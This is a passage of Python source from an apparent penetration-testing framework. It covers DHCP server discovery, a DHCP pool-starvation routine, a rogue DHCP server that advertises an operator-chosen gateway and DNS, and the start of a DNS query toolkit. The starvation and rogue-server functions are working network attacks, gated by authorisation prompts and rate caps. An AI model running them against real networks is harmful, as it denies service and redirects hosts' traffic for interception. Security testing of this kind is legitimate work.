                       requested_ip: Optional[str] = None, msg_type: str = "discover",
                       server_id: Optional[str] = None, ciaddr: str = "0.0.0.0") -> Any:
        if not DHCP_AVAILABLE:
            raise FrameworkError("scapy DHCP layers unavailable (%s)" % DHCP_IMPORT_ERROR)
        try:
            chaddr = mac_to_chaddr(client_mac)
        except FrameworkError:
            raise
        xid = int(xid) if xid is not None else random.randint(1, 0xFFFFFFFF)
        options: List[Any] = [("message-type", msg_type)]
        if hostname:
            options.append(("hostname", str(hostname)[:60]))
        if msg_type == "request" and requested_ip:
            options.append(("requested_addr", str(requested_ip)))
        if server_id:
            options.append(("server_id", str(server_id)))
        options.extend([("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]), "end"])
        return (Ether(dst="ff:ff:ff:ff:ff:ff", src=client_mac)
                / IP(src=ciaddr, dst="255.255.255.255")
                / UDP(sport=68, dport=67)
                / BOOTP(op=1, xid=xid, chaddr=chaddr, htype=1, hlen=6,
                        flags=0x8000, ciaddr=ciaddr)
                / DHCP(options=options))

    @staticmethod
    def build_release(client_mac: str, xid: int, ciaddr: str, server_id: str) -> Any:
        return DHCPEngine.build_discover(client_mac, xid=xid, msg_type="release",
                                         server_id=server_id, ciaddr=ciaddr)

    @staticmethod
    def build_offer_or_ack(kind: str, client_mac: str, xid: int, yiaddr: str,
                           server_ip: str, lease_time: int, subnet_mask: str,
                           gateway: str, dns: str, broadcast_reply: bool = True) -> Any:
        if kind not in ("offer", "ack", "nak"):
            raise FrameworkError("unsupported DHCP reply kind '%s'" % kind)
        chaddr = mac_to_chaddr(client_mac)
        options: List[Any] = [("message-type", kind), ("server_id", str(server_ip))]
        if kind != "nak":
            options.extend([
                ("lease_time", int(lease_time)),
                ("subnet_mask", str(subnet_mask)),
                ("router", str(gateway)),
                ("name_server", str(dns)),
                ("renewal_time", max(60, int(lease_time) // 2)),
                ("rebinding_time", max(120, int((lease_time * 7) // 8))),
            ])
        options.append("end")
        ether_dst = "ff:ff:ff:ff:ff:ff" if broadcast_reply else client_mac
        ip_dst = "255.255.255.255" if broadcast_reply else str(yiaddr)
        return (Ether(dst=ether_dst, src=InterfaceManager.hwaddr(InterfaceManager.primary_interface() or "lo"))
                / IP(src=str(server_ip), dst=ip_dst)
                / UDP(sport=67, dport=68)
                / BOOTP(op=2, xid=int(xid), yiaddr=str(yiaddr),
                        siaddr=str(server_ip), chaddr=chaddr, htype=1, hlen=6,
                        flags=0x8000 if broadcast_reply else 0)
                / DHCP(options=options))

    @staticmethod
    def parse_packet(packet: Any) -> Optional[Dict[str, Any]]:
        """Decode a DHCP packet into a normalised record (or None)."""
        if not DHCP_AVAILABLE:
            return None
        try:
            if not (packet.haslayer(BOOTP) and packet.haslayer(DHCP)):
                return None
            bootp = packet[BOOTP]
            options = dhcp_options_to_dict(packet[DHCP].options)
            record = OrderedDict([
                ("op", int(bootp.op)),
                ("xid", int(bootp.xid)),
                ("yiaddr", str(bootp.yiaddr)),
                ("giaddr", str(bootp.giaddr or "0.0.0.0")),
                ("client_mac", str(bootp.chaddr[:6].hex(":")) if bootp.chaddr else ""),
                ("broadcast", bool(int(bootp.flags or 0) & 0x8000)),
                ("message_type", options.get("message_type", "UNKNOWN")),
                ("server_id", options.get("server_id", "")),
                ("requested_addr", options.get("requested_addr", "")),
                ("hostname", options.get("hostname", "")),
                ("subnet_mask", options.get("subnet_mask", "")),
                ("router", options.get("router", "")),
                ("dns", options.get("dns", "")),
                ("lease_time", options.get("lease_time", "")),
                ("raw_options", {key: (value.hex() if isinstance(value, bytes) else value)
                                 for key, value in options.items()}),
            ])
            return record
        except (AttributeError, IndexError, KeyError, TypeError, ValueError) as exc:
            LOGGER.event("warn", "DHCP parse failure: %s" % exc, level="WARN")
            return None


def dhcp_discover_servers(iface: Optional[str], timeout: float = 6.0,
                          hostname: str = "prismstrike-probe") -> Dict[str, Any]:
    """Broadcast a DHCPDISCOVER and enumerate every server that answers."""
    if not require_scapy("DHCP server discovery"):
        raise FrameworkError("scapy unavailable")
    if not DHCP_AVAILABLE:
        raise FrameworkError("scapy DHCP layers unavailable: %s" % DHCP_IMPORT_ERROR)
    client_mac = InterfaceManager.hwaddr(iface or InterfaceManager.primary_interface() or "lo")
    if not client_mac or client_mac == "n/a":
        client_mac = random_client_mac()
    xid = random.randint(1, 0xFFFFFFFF)
    request = DHCPEngine.build_discover(client_mac, xid=xid, hostname=hostname)
    note("broadcasting DHCPDISCOVER (xid=0x%08x, client=%s) and listening %.1fs for offers"
         % (xid, client_mac, timeout))
    offers: List[Dict[str, Any]] = []
    ack_seen: List[Dict[str, Any]] = []

    def _observe(packet: Any) -> None:
        record = DHCPEngine.parse_packet(packet)
        if record is None:
            return
        if record["op"] == 2 and record["xid"] == xid:
            if record["message_type"] == "OFFER":
                offers.append(record)
            elif record["message_type"] in ("ACK", "NAK"):
                ack_seen.append(record)

    kwargs: Dict[str, Any] = {"prn": _observe, "store": False, "timeout": max(1.0, timeout),
                              "filter": "udp and (port 67 or port 68)"}
    if iface:
        kwargs["iface"] = iface
    capture_error = ""
    try:
        sniffer = scapy.AsyncSniffer(**kwargs)
        sniffer.start()
        time.sleep(0.4)
        try:
            sendp(request, verbose=0, iface=iface)
        except (OSError, PermissionError) as exc:
            raise FrameworkError("DHCPDISCOVER transmission failed: %s" % exc)
        deadline = time.time() + max(1.0, timeout)
        while time.time() < deadline:
            time.sleep(0.2)
        sniffer.stop()
    except OSError as exc:
        capture_error = "capture layer error: %s" % exc
    heading("DHCP SERVER DISCOVERY")
    if capture_error:
        warn(capture_error)
    if offers:
        out(c("  %-16s %-18s %-16s %-16s %-10s %s" % (
            "SERVER ID", "OFFERED ADDRESS", "SUBNET MASK", "ROUTER", "LEASE(s)", "DNS"), "bold"))
        for record in offers:
            out("  %-16s %-18s %-16s %-16s %-10s %s" % (
                c(record["server_id"] or "?", "bgreen", "bold"), record["yiaddr"],
                record["subnet_mask"] or "-", str(record["router"]) or "-",
                record["lease_time"] or "-", str(record["dns"]) or "-"))
        note("%d DHCP server(s) answered. More than one responder is a rogue-server warning sign." % len(offers))
        if alerts_armed():
            for record in offers:
                alert_dhcp_server(record.get("server_id", ""), record.get("yiaddr", ""),
                                  record.get("router"), record.get("lease_time"))
    else:
        warn("no DHCPOFFER received - no server on this segment, or offers were filtered.")
    summary = OrderedDict([
        ("mode", "dhcp-discovery"),
        ("interface", iface or "auto"),
        ("client_mac", client_mac),
        ("xid", "0x%08x" % xid),
        ("offers", offers),
        ("acks", ack_seen),
        ("capture_error", capture_error),
        ("options", {"timeout": timeout, "hostname": hostname}),
    ])
    artifact = LOGGER.scan("dhcp_discovery", summary, target=iface or "auto")
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def dhcp_starvation(iface: Optional[str], count: int = 100, rate_per_second: float = 20.0,
                    request_leases: bool = True, release_at_end: bool = False,
                    timeout: float = 5.0) -> Dict[str, Any]:
    """
    Authorised DHCP pool-exhaustion stress test.

    Transmits unique-client DISCOVER (optionally REQUEST) bursts at a bounded
    rate, recording every lease offered. RELEASE frames for the acquired leases
    can be sent at the end so a lab pool recovers without waiting out the lease
    timers. Hard caps: 5,000 clients, 200 messages/second.
    """
    if not require_scapy("DHCP starvation"):
        raise FrameworkError("scapy unavailable")
    if not DHCP_AVAILABLE:
        raise FrameworkError("scapy DHCP layers unavailable: %s" % DHCP_IMPORT_ERROR)
    count = int(count)
    if not (1 <= count <= 5000):
        raise FrameworkError("client count must be between 1 and 5000")
    rate = float(rate_per_second)
    if not (0.5 <= rate <= 200.0):
        raise FrameworkError("rate must be between 0.5 and 200 messages per second")
    interval = 1.0 / rate
    note("starvation test: %d synthetic clients at %.0f msg/s (requests=%s, release-at-end=%s)"
         % (count, rate, request_leases, release_at_end))
    acquired: List[Dict[str, Any]] = []
    xid_map: Dict[str, int] = {}
    offers_seen = 0
    lock = threading.Lock()

    def _observe(packet: Any) -> None:
        nonlocal offers_seen
        record = DHCPEngine.parse_packet(packet)
        if record is None or record["op"] != 2:
            return
        with lock:
            if record["message_type"] == "OFFER":
                offers_seen += 1
                acquired.append(OrderedDict([
                    ("client_mac", record["client_mac"]),
                    ("xid", record["xid"]),
                    ("offered_ip", record["yiaddr"]),
                    ("server_id", record["server_id"]),
                    ("subnet_mask", record["subnet_mask"]),
                    ("router", str(record["router"])),
                    ("lease_time", record["lease_time"]),
                    ("acquired_at", format_timestamp()),
                ]))

    kwargs: Dict[str, Any] = {"prn": _observe, "store": False,
                              "filter": "udp and (port 67 or port 68)"}
    if iface:
        kwargs["iface"] = iface
    sniffer = scapy.AsyncSniffer(**kwargs)
    sniffer.start()
    time.sleep(0.4)
    stats = TrafficStats("dhcp-starvation")
    aborted = False
    # Pacing model: the DISCOVER -> REQUEST gap is a micro-gap that keeps the pair
    # close together without spending the operator's per-client budget, and every
    # client slot is measured against an absolute deadline so transmit time and
    # scheduler jitter can neither stretch nor compress the requested rate.
    pair_gap = max(0.001, min(interval / 4.0, 0.05))
    loop_started = time.time()
    next_slot = loop_started
    try:
        for index in range(count):
            client_mac = random_client_mac("02")
            xid = random.randint(1, 0xFFFFFFFF)
            xid_map[client_mac] = xid
            try:
                sendp(DHCPEngine.build_discover(client_mac, xid=xid, hostname="prismstrike-%04d" % index),
                      verbose=0, iface=iface)
                stats.record_send()
                if request_leases:
                    time.sleep(pair_gap)
                    sendp(DHCPEngine.build_discover(client_mac, xid=xid, msg_type="request",
                                                    requested_ip=None),
                          verbose=0, iface=iface)
                    stats.record_send()
            except (OSError, PermissionError) as exc:
                stats.record_error()
                LOGGER.event("warn", "starvation transmit error: %s" % exc, level="WARN")
            if index % 25 == 0 and index:
                out("  ...%d/%d clients issued (%d offers observed)" % (index, count, offers_seen))
            next_slot += interval
            drift = next_slot - time.time()
            if drift > 0:
                time.sleep(drift)
            elif drift < -1.0:
                # a full second behind schedule: re-base the clock instead of
                # bursting to catch up, which would defeat the pacing limit
                next_slot = time.time()
        elapsed_loop = max(0.001, time.time() - loop_started)
        note("pacing: requested %.1f msg/s, achieved %.1f msg/s (%d frame(s) in %.2fs)"
             % (rate, stats.sent / elapsed_loop, stats.sent, elapsed_loop))
        out("  waiting %.1fs for late offers ..." % timeout)
        time.sleep(max(0.5, timeout))
    except KeyboardInterrupt:
        aborted = True
        warn("starvation loop interrupted by operator.")
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass
        stats.stop()
    stats.received = offers_seen
    heading("STARVATION TEST RESULT")
    kv_table([
        ("Synthetic clients", count),
        ("Messages transmitted", stats.sent),
        ("Offers observed", offers_seen),
        ("Unique leases held", len({entry["offered_ip"] for entry in acquired})),
        ("Run time", format_duration(stats.report()["elapsed_seconds"])),
        ("Aborted", aborted),
    ])
    if acquired:
        pool_sample = [entry["offered_ip"] for entry in acquired[:10]]
        note("first leases: %s%s" % (", ".join(pool_sample),
                                     " ..." if len(acquired) > 10 else ""))
        if len(acquired) >= count:
            warn("every synthetic client received an offer - the pool may now be exhausted.")
    else:
        warn("no offers observed - no DHCP service on this segment (or filtered).")
    released = 0
    if release_at_end and acquired:
        note("issuing DHCPRELEASE for %d lease(s) to restore the pool ..." % len(acquired))
        for entry in acquired:
            try:
                release_frame = DHCPEngine.build_release(entry["client_mac"], entry["xid"],
                                                         entry["offered_ip"],
                                                         entry["server_id"] or "0.0.0.0")
                sendp(release_frame, verbose=0, iface=iface)
                released += 1
                time.sleep(0.01)
            except (OSError, FrameworkError) as exc:
                LOGGER.event("warn", "release failed: %s" % exc, level="WARN")
        ok("released %d lease(s)." % released)
    summary = OrderedDict([
        ("mode", "dhcp-starvation"),
        ("interface", iface or "auto"),
        ("clients", count),
        ("rate_per_second", rate),
        ("rate_achieved_per_second", round(stats.sent / max(0.001, time.time() - loop_started), 2)),
        ("pair_gap_seconds", round(pair_gap, 4)),
        ("messages_sent", stats.sent),
        ("offers_observed", offers_seen),
        ("leases", acquired),
        ("unique_ips", sorted({entry["offered_ip"] for entry in acquired})),
        ("released", released),
        ("aborted", aborted),
    ])
    artifact = LOGGER.scan("dhcp_starvation", summary, target=iface or "auto")
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def rogue_dhcp_server(iface: Optional[str], server_ip: str, subnet_mask: str = "255.255.255.0",
                      gateway: Optional[str] = None, dns: Optional[str] = None,
                      pool_start: Optional[str] = None, pool_end: Optional[str] = None,
                      lease_time: int = 600, duration: float = 120.0,
                      server_mac: Optional[str] = None) -> Dict[str, Any]:
    """
    Authorised rogue-DHCP lab server.

    Answers DISCOVER with OFFER and REQUEST with ACK from a managed pool,
    honouring the client's broadcast flag, and tracks every lease handed out.
    Runs until the duration elapses or the operator presses Ctrl-C, then prints
    the lease ledger so the lab can be torn down deliberately.
    """
    if not require_scapy("Rogue DHCP server"):
        raise FrameworkError("scapy unavailable")
    if not DHCP_AVAILABLE:
        raise FrameworkError("scapy DHCP layers unavailable: %s" % DHCP_IMPORT_ERROR)
    iface_name = iface or InterfaceManager.primary_interface()
    if not iface_name:
        raise FrameworkError("no interface available for the DHCP server")
    if not server_ip:
        raise FrameworkError("a server address is mandatory")
    if gateway is None:
        gateway = InterfaceManager.discover_gateway(iface_name) or server_ip
    if dns is None:
        dns = server_ip
    if not pool_start or not pool_end:
        try:
            network = ipaddress.IPv4Network("%s/%s" % (server_ip, subnet_mask), strict=False)
            usable = list(network.hosts())
            if len(usable) < 3:
                raise FrameworkError("subnet %s is too small for a DHCP pool" % network)
            pool_start = pool_start or str(usable[1])
            pool_end = pool_end or str(usable[-1])
        except (ValueError, ipaddress.NetmaskValueError) as exc:
            raise FrameworkError("could not derive a pool from %s/%s: %s" % (server_ip, subnet_mask, exc))
    try:
        first = ipaddress.IPv4Address(pool_start)
        last = ipaddress.IPv4Address(pool_end)
    except (ipaddress.AddressValueError, ValueError) as exc:
        raise FrameworkError("invalid pool range: %s" % exc)
    if int(last) < int(first):
        raise FrameworkError("pool end %s precedes pool start %s" % (pool_end, pool_start))
    pool_size = int(last) - int(first) + 1
    if pool_size > 4096:
        raise FrameworkError("pool of %d addresses exceeds the 4096 ceiling" % pool_size)
    own_mac = server_mac or InterfaceManager.hwaddr(iface_name)
    if not own_mac or own_mac == "n/a":
        raise FrameworkError("could not determine the serving interface MAC address")
    heading("ROGUE DHCP SERVER (AUTHORISED LAB)")
    kv_table([
        ("Interface", iface_name),
        ("Server address", server_ip),
        ("Server MAC", own_mac),
        ("Pool", "%s - %s (%d addresses)" % (pool_start, pool_end, pool_size)),
        ("Offered gateway", gateway),
        ("Offered DNS", dns),
        ("Lease time", "%d s" % lease_time),
        ("Run duration", format_duration(duration)),
    ])
    warn("clients that accept this lease will route through the advertised gateway - "
         "appropriate only for isolated lab segments or authorised assessments.")
    if not prompt_yes_no("Start the rogue DHCP responder now", False):
        warn("rogue DHCP server cancelled by operator.")
        return OrderedDict([("aborted", True)])
    leases: Dict[str, Dict[str, Any]] = {}
    free_addresses = [str(ipaddress.IPv4Address(int(first) + offset)) for offset in range(pool_size)]
    lock = threading.RLock()
    counters = {"discover": 0, "request": 0, "release": 0, "offers": 0, "acks": 0, "errors": 0}

    def _allocate(client_mac: str) -> Optional[str]:
        with lock:
            for address, holder in list(leases.items()):
                if holder["client_mac"] == client_mac:
                    return address
            if not free_addresses:
                return None
            address = free_addresses.pop(0)
            leases[address] = OrderedDict([
                ("client_mac", client_mac), ("allocated_at", format_timestamp()),
                ("state", "offered"), ("requested", ""),
            ])
            return address

    def _handle(packet: Any) -> None:
        record = DHCPEngine.parse_packet(packet)
        if record is None or record["op"] != 1:
            return
        client_mac = record["client_mac"]
        message_type = record["message_type"]
        try:
            if message_type == "DISCOVER":
                counters["discover"] += 1
                offered = _allocate(client_mac)
                if offered is None:
                    LOGGER.event("warn", "DHCP pool exhausted - no offer for %s" % client_mac, level="WARN")
                    return
                reply = DHCPEngine.build_offer_or_ack("offer", client_mac, record["xid"], offered,
                                                      server_ip, lease_time, subnet_mask,
                                                      gateway, dns,
                                                      broadcast_reply=record["broadcast"])
                sendp(reply, verbose=0, iface=iface_name)
                counters["offers"] += 1
                LOGGER.event("dhcp", "OFFER %s -> %s" % (offered, client_mac))
            elif message_type == "REQUEST":
                counters["request"] += 1
                requested = record["requested_addr"] or ""
                with lock:
                    address = None
                    if requested and requested in leases and leases[requested]["client_mac"] == client_mac:
                        address = requested
                    else:
                        for candidate, holder in leases.items():
                            if holder["client_mac"] == client_mac:
                                address = candidate
                                break
                    if address is None:
                        address = _allocate(client_mac)
                    if address is None:
                        nak = DHCPEngine.build_offer_or_ack("nak", client_mac, record["xid"],
                                                            "0.0.0.0", server_ip, 0, subnet_mask,
                                                            gateway, dns,
                                                            broadcast_reply=True)
                        sendp(nak, verbose=0, iface=iface_name)
                        LOGGER.event("dhcp", "NAK (pool exhausted) for %s" % client_mac, level="WARN")
                        return
                    leases[address]["state"] = "acked"
                    leases[address]["requested"] = str(requested)
                    leases[address]["acked_at"] = format_timestamp()
                reply = DHCPEngine.build_offer_or_ack("ack", client_mac, record["xid"], address,
                                                      server_ip, lease_time, subnet_mask,
                                                      gateway, dns,
                                                      broadcast_reply=record["broadcast"])
                sendp(reply, verbose=0, iface=iface_name)
                counters["acks"] += 1
                out("  %s %-16s %-19s %-16s" % (c("LEASE", "bgreen", "bold"),
                                                time.strftime("%H:%M:%S"), client_mac, address))
                LOGGER.event("dhcp", "ACK %s -> %s" % (address, client_mac))
            elif message_type in ("RELEASE", "DECLINE"):
                counters["release"] += 1
                with lock:
                    for address, holder in list(leases.items()):
                        if holder["client_mac"] == client_mac:
                            holder["state"] = "released"
                            if address not in free_addresses:
                                free_addresses.append(address)
                            del leases[address]
                            LOGGER.event("dhcp", "%s for %s (address %s returned to pool)"
                                         % (message_type, client_mac, address))
                            break
            elif message_type == "INFORM":
                # Answer INFORM with an ACK carrying configuration only.
                reply = DHCPEngine.build_offer_or_ack("ack", client_mac, record["xid"], "0.0.0.0",
                                                      server_ip, lease_time, subnet_mask,
                                                      gateway, dns, broadcast_reply=True)
                sendp(reply, verbose=0, iface=iface_name)
                counters["acks"] += 1
        except (OSError, FrameworkError) as exc:
            counters["errors"] += 1
            LOGGER.event("warn", "DHCP responder error: %s" % exc, level="WARN")
        except Exception as exc:  # containment: one bad frame must not kill the server
            counters["errors"] += 1
            LOGGER.event("error", "DHCP responder unexpected error: %s: %s"
                         % (type(exc).__name__, exc), level="ERROR")

    kwargs: Dict[str, Any] = {"prn": _handle, "store": False,
                              "filter": "udp and dst port 67", "iface": iface_name}
    sniffer = scapy.AsyncSniffer(**kwargs)
    started = time.time()
    try:
        sniffer.start()
        ok("responder active - pressing Ctrl-C stops it early.")
        deadline = started + max(5.0, float(duration))
        while time.time() < deadline:
            time.sleep(0.25)
            if int(time.time() - started) % 30 == 0:
                with lock:
                    active = sum(1 for holder in leases.values() if holder["state"] == "acked")
                LOGGER.event("dhcp", "responder heartbeat: %d active leases, %d free addresses"
                             % (active, len(free_addresses)))
                time.sleep(1.0)
    except KeyboardInterrupt:
        warn("rogue DHCP server stopped by operator.")
    except OSError as exc:
        raise FrameworkError("responder capture failure: %s" % exc)
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass
    heading("ROGUE DHCP SERVER SUMMARY")
    kv_table([
        ("Runtime", format_duration(time.time() - started)),
        ("DISCOVER messages", counters["discover"]),
        ("REQUEST messages", counters["request"]),
        ("OFFERs sent", counters["offers"]),
        ("ACKs sent", counters["acks"]),
        ("RELEASE/DECLINE seen", counters["release"]),
        ("Errors", counters["errors"]),
        ("Addresses remaining", len(free_addresses)),
    ])
    if leases:
        out(c("  lease ledger (unexpired at shutdown)", "cyan"))
        for address, holder in sorted(leases.items()):
            out("    %-16s %-19s %-10s %s" % (address, holder["client_mac"], holder["state"],
                                              c(holder["allocated_at"], "grey")))
    else:
        note("no clients requested a lease during this run.")
    warn("teardown: stop any ARP MITM first, then refresh client leases "
         "(ipconfig /release + renew) so they fall back to the legitimate server.")
    summary = OrderedDict([
        ("mode", "rogue-dhcp-server"),
        ("interface", iface_name),
        ("server_ip", server_ip), ("server_mac", own_mac),
        ("pool", {"start": pool_start, "end": pool_end, "size": pool_size,
                  "remaining": len(free_addresses)}),
        ("offered_options", {"gateway": gateway, "dns": dns, "subnet_mask": subnet_mask,
                             "lease_time": lease_time}),
        ("counters", counters),
        ("leases", leases),
        ("duration_seconds", round(time.time() - started, 2)),
    ])
    artifact = LOGGER.scan("rogue_dhcp", summary, target=server_ip)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


@root_required
@module_guard("DHCP Operations")
def module_dhcp(args: Optional[List[str]] = None) -> None:
    """Interactive DHCP suite: server discovery, starvation testing, rogue serving."""
    if not DHCP_AVAILABLE:
        err("scapy DHCP layers unavailable: %s" % DHCP_IMPORT_ERROR)
        note("reinstall/upgrade scapy (python3 -m pip install -U scapy) and retry.")
        return
    while True:
        heading("MODULE 14 - DHCP OPERATIONS")
        out("  %s" % c("authorised lab / assessment use only - DHCP affects every host on the segment",
                       "byellow"))
        options = OrderedDict([
            ("1", "Discover DHCP servers on the segment (broadcast + listen)"),
            ("2", "Starvation stress test (synthetic clients, bounded rate)"),
            ("3", "Rogue DHCP server (managed pool, lease ledger)"),
            ("4", "DHCP option / message reference"),
            ("5", "ONLINE: DHCP telemetry (lease push, server alerts, syslog)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("dhcp> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "5":
            online_dhcp_console()
            continue
        if choice == "0":
            return
        iface = None
        if choice in ("1", "2", "3"):
            InterfaceManager.display()
            iface_raw = prompt_text("interface", default=InterfaceManager.primary_interface() or "eth0")
            if iface_raw is PROMPT_ABORT:
                continue
            iface = str(iface_raw).strip() or None
        if choice == "1":
            timeout = prompt_float("listen window seconds", 1.0, 60.0, 6.0)
            if timeout is PROMPT_ABORT:
                continue
            dhcp_discover_servers(iface, timeout=float(timeout))
        elif choice == "2":
            warn("this will hand out many synthetic clients to the DHCP server on your segment.")
            count = prompt_int("number of synthetic clients", 1, 5000, 100)
            if count is PROMPT_ABORT:
                continue
            rate = prompt_float("messages per second", 0.5, 200.0, 20.0)
            if rate is PROMPT_ABORT:
                continue
            requests = prompt_yes_no("follow each DISCOVER with a REQUEST (binds the lease)?", True)
            release = prompt_yes_no("send RELEASE frames at the end to restore the pool?", False)
            if not prompt_yes_no("Confirm authorisation for a DHCP pool stress test", False):
                warn("starvation test cancelled.")
                continue
            dhcp_starvation(iface, count=int(count), rate_per_second=float(rate),
                            request_leases=requests, release_at_end=release)
        elif choice == "3":
            iface_name = iface or InterfaceManager.primary_interface()
            default_server = InterfaceManager.address(iface_name or "") or ""
            server_raw = prompt_text("server address to advertise", default=default_server or None)
            if server_raw is PROMPT_ABORT:
                continue
            try:
                server_ip = parse_ipv4(server_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            mask_raw = prompt_text("subnet mask", default="255.255.255.0")
            if mask_raw is PROMPT_ABORT:
                continue
            try:
                ipaddress.IPv4Network("0.0.0.0/%s" % mask_raw, strict=False)
                subnet_mask = str(mask_raw)
            except (ValueError, ipaddress.NetmaskValueError) as exc:
                err("invalid subnet mask: %s" % exc)
                continue
            gateway_raw = prompt_text("gateway to advertise",
                                      default=InterfaceManager.discover_gateway(iface_name) or server_ip)
            if gateway_raw is PROMPT_ABORT:
                continue
            dns_raw = prompt_text("DNS server to advertise", default=str(server_ip))
            if dns_raw is PROMPT_ABORT:
                continue
            pool_start_raw = prompt_text("pool start (blank = derive from subnet)", default="", allow_blank=True)
            if pool_start_raw is PROMPT_ABORT:
                continue
            pool_end_raw = prompt_text("pool end (blank = derive from subnet)", default="", allow_blank=True)
            if pool_end_raw is PROMPT_ABORT:
                continue
            lease = prompt_int("lease time seconds", 60, 86400, 600)
            if lease is PROMPT_ABORT:
                continue
            duration = prompt_float("run duration seconds", 5.0, 7200.0, 120.0)
            if duration is PROMPT_ABORT:
                continue
            try:
                rogue_dhcp_server(iface, str(server_ip), subnet_mask=subnet_mask,
                                  gateway=str(gateway_raw) or None, dns=str(dns_raw) or None,
                                  pool_start=str(pool_start_raw).strip() or None,
                                  pool_end=str(pool_end_raw).strip() or None,
                                  lease_time=int(lease), duration=float(duration))
            except FrameworkError as exc:
                err(str(exc))
        elif choice == "4":
            heading("DHCP REFERENCE")
            for value, name in sorted(DHCP_MESSAGE_TYPES.items()):
                out("  %s  %s" % (c("type %d" % value, "cyan"), name))
            out("")
            out(c("  common options", "cyan"))
            references = [
                ("1  subnet_mask", "client subnet mask"),
                ("3  router", "default gateway list"),
                ("6  name_server", "DNS resolvers"),
                ("15 domain", "DNS search domain"),
                ("51 lease_time", "lease duration in seconds"),
                ("53 message-type", "DHCP message type"),
                ("54 server_id", "responding server address"),
                ("55 param_req_list", "requested option list"),
                ("58/59 renewal/rebinding", "T1/T2 timers"),
                ("82 relay agent info", "option-82 relay context (often carries client switch/port)"),
            ]
            for label, description in references:
                out("  %s  %s" % (c(label.ljust(24), "cyan"), c(description, "grey")))
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 15 - DNS TOOLKIT (native resolver, passive monitor, spoof engine)
# ===========================================================================
DNS_LAYERS_AVAILABLE = False
DNS_LAYERS_ERROR = ""
try:
    from scapy.all import DNSQR, DNSRR  # type: ignore[import-not-found]
    DNS_LAYERS_AVAILABLE = True
except Exception as _dns_exc:  # pragma: no cover - environment dependent
    DNS_LAYERS_ERROR = "%s: %s" % (type(_dns_exc).__name__, _dns_exc)

DNS_QTYPE_MAP = {
    "A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "PTR": 12, "MX": 15, "TXT": 16,
    "AAAA": 28, "SRV": 33, "ANY": 255,
}
DNS_QTYPE_NAMES = {value: key for key, value in DNS_QTYPE_MAP.items()}
DNS_RCODE_NAMES = {
    0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN", 4: "NOTIMP",
    5: "REFUSED", 6: "YXDOMAIN", 7: "YXRRSET", 8: "NXRRSET", 9: "NOTAUTH",
    10: "NOTZONE",
}


def dns_shannon_entropy(text: str) -> float:
    """Shannon entropy (bits per character) - the core DNS-tunnelling heuristic."""
    import math as _math
    if not text:
        return 0.0
    frequencies: Dict[str, int] = {}
    for character in text:
        frequencies[character] = frequencies.get(character, 0) + 1
    entropy = 0.0
    length = float(len(text))
    for count in frequencies.values():
        probability = count / length
        entropy -= probability * _math.log2(probability)
    return round(entropy, 3)


def _dns_names_to_text(value: Any) -> str:
    """Render a scapy DNS name (bytes) as a dotted string."""
    try:
        if isinstance(value, (bytes, bytearray)):
            return bytes(value).decode("utf-8", "replace").rstrip(".")
        return str(value).rstrip(".")
    except (UnicodeDecodeError, AttributeError, TypeError):
        return str(value)


def dns_query_native(name: str, qtype: str = "A", server: Optional[str] = None,
                     timeout: float = 3.0, iface: Optional[str] = None,
                     recursion: bool = True, source_port: Optional[int] = None) -> Dict[str, Any]:
    """
    Resolve a record with a hand-built DNS query over scapy (no dnspython).

    Supports A, AAAA, PTR (automatic in-addr.arpa construction from an IPv4
    literal), MX, TXT, NS, SOA, CNAME, SRV and ANY, and reports the full answer
    chain plus timings and rcode.
    """
    if not require_scapy("DNS query"):
        raise FrameworkError("scapy unavailable")
    if not DNS_LAYERS_AVAILABLE:
        raise FrameworkError("scapy DNS record layers unavailable: %s" % DNS_LAYERS_ERROR)
    qtype_key = str(qtype or "A").upper()
    if qtype_key not in DNS_QTYPE_MAP:
        raise FrameworkError("unsupported query type '%s' (try A, AAAA, MX, TXT, NS, SOA, PTR, SRV)" % qtype)
    target = str(name).strip()
    if qtype_key == "PTR" and re.fullmatch(r"\d+\.\d+\.\d+\.\d+", target):
        octets = target.split(".")
        target = "%s.in-addr.arpa" % ".".join(reversed(octets))
        note("PTR query rewritten to %s" % target)
    if not target:
        raise FrameworkError("query name is empty")
    if server is None:
        dns_servers = SystemIntel.dns_servers()
        server = dns_servers[0] if dns_servers else "1.1.1.1"
        if dns_servers:
            note("using system resolver %s" % server)
    # A server may be named "ip" or "ip:port"; the port form lets an operator
    # (and the self-test suite) point at a lab resolver on a non-standard port.
    server_port = 53
    server_spec = str(server).strip()
    if server_spec.count(":") == 1 and server_spec.rsplit(":", 1)[1].isdigit():
        host_part, port_part = server_spec.rsplit(":", 1)
        try:
            server_port = parse_port(port_part)
        except FrameworkError as exc:
            raise FrameworkError("invalid DNS server port in '%s': %s" % (server_spec, exc))
        server_spec = host_part
    server_ip = resolve_target(server_spec)
    if not server_ip:
        raise FrameworkError("unable to resolve DNS server '%s'" % server)
    identifier = random.randint(0, 0xFFFF)
    # Pinning the source port (optionally to a socket the caller already holds
    # open) keeps the exchange deterministic and stops the kernel from answering
    # our own probe with an ICMP port-unreachable when the reply comes back.
    local_port = random_source_port()
    if source_port is not None:
        try:
            local_port = parse_port(source_port, allow_zero=False)
        except FrameworkError as exc:
            raise FrameworkError("invalid source port: %s" % exc)
    packet = (IP(dst=server_ip) / UDP(sport=local_port, dport=server_port)
              / DNS(id=identifier, rd=1 if recursion else 0,
                    qd=DNSQR(qname=target, qtype=DNS_QTYPE_MAP[qtype_key])))
    started = time.time()
    kwargs: Dict[str, Any] = {"timeout": max(0.3, timeout), "verbose": 0}
    if iface:
        kwargs["iface"] = iface
    try:
        reply = sr1(packet, **kwargs)
    except (OSError, PermissionError) as exc:
        raise FrameworkError("DNS query transmission failed: %s" % exc)
    elapsed_ms = round((time.time() - started) * 1000.0, 2)
    result: Dict[str, Any] = OrderedDict([
        ("name", target), ("qtype", qtype_key), ("server", server_ip),
